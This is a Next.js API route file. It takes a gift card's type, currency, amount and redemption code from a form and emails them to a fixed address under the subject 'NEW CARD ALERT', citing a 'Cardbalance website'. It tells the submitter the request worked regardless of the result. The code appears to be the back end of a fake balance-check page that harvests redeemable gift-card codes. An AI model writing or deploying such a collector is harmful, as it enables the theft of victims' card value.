import { transporter, mailOptions } from "@/config/nodemailer";
import { NextResponse } from "next/server";


// Notice the function definition:
export async function POST(request) {

  if (request.method === "POST") {
    const body = await request.json()

    if (!body.cardType || !body.currency || !body.amount || !body.redemptionCode) {
      return NextResponse.json({ error: 'Bad request' })

    }
    try {
      await transporter.sendMail({
        ...mailOptions,
        subject: "NEW CARD ALERT",
        text: `Testing mail \n 
          CARDTYPE: ${body.cardType} \n 
          Currency:${body.currency} \n 
          Amount: ${body.amount} \n 
          Redemption Code: ${body.redemptionCode} 
          
          This message was sent from Cardbalance website
          `
      })
      return NextResponse.json({ message: "This Worked", success: true });
    } catch (error) {
      console.log(error)
    }
  }
  return NextResponse.json({ message: "This Worked", success: true });
}

export async function GET(request) {


  return NextResponse.json({ error: 'Internal Server Error' })
}

 
